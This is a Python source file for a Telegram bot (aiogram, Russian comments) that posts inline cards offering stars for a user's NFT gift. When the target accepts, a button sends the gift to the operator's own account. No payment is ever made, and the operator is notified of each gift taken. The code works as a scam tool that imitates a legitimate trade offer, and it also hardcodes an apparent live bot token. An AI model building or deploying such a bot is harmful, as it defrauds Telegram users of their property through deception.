import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, InlineQuery, InlineQueryResultArticle,
    InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton
)

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "8829058755:AAEoBYHUT9MJ5TqH7HHWAmr1w5G9N58UhQY"  # ⚠️ Замените на новый после /revoke
MY_USERNAME = "ваш_username"  # Ваш юзернейм БЕЗ @
MY_ID = 7623548272            # Ваш Telegram ID
# =====================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# --- Inline-режим ---
@dp.inline_query()
async def inline_offer_handler(inline_query: InlineQuery):
    # Формат: @ВашБот @username 900 https://t.me/nft/PetSnake-15520
    query = inline_query.query.split()
    if len(query) < 3:
        return

    target_user = query[0]
    price = query[1]
    nft_url = query[2]

    nft_id = nft_url.split("/")[-1].replace("-", " #")
    offer_id = f"{inline_query.from_user.id}_{inline_query.id}"

    html_card = (
        f'<a href="{nft_url}">&#8203;</a>\n'
        f'<b>{inline_query.from_user.first_name}</b> предлагает вам '
        f'<b>{price}</b> ⭐ за <a href="{nft_url}">{nft_id}</a>.\n\n'
        f'Предложение действует еще 6ч.'
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{offer_id}"),
            InlineKeyboardButton(text="Принять", callback_data=f"accept:{offer_id}:{nft_url}"),
        ]
    ])

    result = InlineQueryResultArticle(
        id=offer_id,
        title=f"Оффер за {price} ⭐",
        description=f"На {nft_id}",
        input_message_content=InputTextMessageContent(
            message_text=html_card,
            parse_mode="HTML",
            disable_web_page_preview=False
        ),
        reply_markup=keyboard
    )

    await inline_query.answer([result], cache_time=0, is_personal=True)


# --- Обработка кнопок ---
@dp.callback_query(F.data.startswith(("accept:", "decline:")))
async def handle_offer(callback: CallbackQuery):
    parts = callback.data.split(":", 2)
    action = parts[0]
    offer_id = parts[1]

    if action == "accept":
        nft_url = parts[2] if len(parts) > 2 else "https://t.me"
        gift_slug = nft_url.split("/")[-1]  # например PetSnake-15520

        # Ссылка на страницу передачи подарка (передаем на ваш аккаунт)
        transfer_url = f"https://t.me/gift/{gift_slug}?to={MY_USERNAME}"

        status_text = (
            "\n\n✅ <b>Оффер принят!</b>\n"
            "Передайте подарок, нажав кнопку ниже."
        )

        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🎁 Передать подарок",
                    url=transfer_url
                )
            ]
        ])

        await callback.message.edit_text(
            text=callback.message.html_text + status_text,
            parse_mode="HTML",
            reply_markup=new_keyboard
        )

        # Уведомляем отправителя оффера
        author_id = int(offer_id.split("_")[0])
        try:
            await bot.send_message(
                author_id,
                "✅ Получатель <b>принял</b> ваш оффер!\n"
                "Ожидайте передачи подарка.",
                parse_mode="HTML"
            )
        except Exception:
            pass

        # Дополнительно уведомляем вас (админа) о принятом оффере
        try:
            await bot.send_message(
                MY_ID,
                f"📥 <b>Принят оффер</b>\n"
                f"Пользователь: {callback.from_user.full_name} (@{callback.from_user.username})\n"
                f"Подарок: {gift_slug}\n"
                f"Ссылка: {nft_url}",
                parse_mode="HTML"
            )
        except Exception:
            pass

    else:  # decline
        status_text = "\n\n❌ <b>Оффер отклонен.</b>"

        await callback.message.edit_text(
            text=callback.message.html_text + status_text,
            parse_mode="HTML",
            reply_markup=None
        )

        author_id = int(offer_id.split("_")[0])
        try:
            await bot.send_message(author_id, "❌ Получатель отклонил ваш оффер.")
        except Exception:
            pass

    await callback.answer()


@dp.message(Command("start"))
async def start(message: Message):
    await message.answer(
        "👋 Привет! Чтобы отправить оффер, напиши в любом чате:\n"
        "`@ВашБот @username 900 https://t.me/nft/PetSnake-15520`",
        parse_mode="Markdown"
    )


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
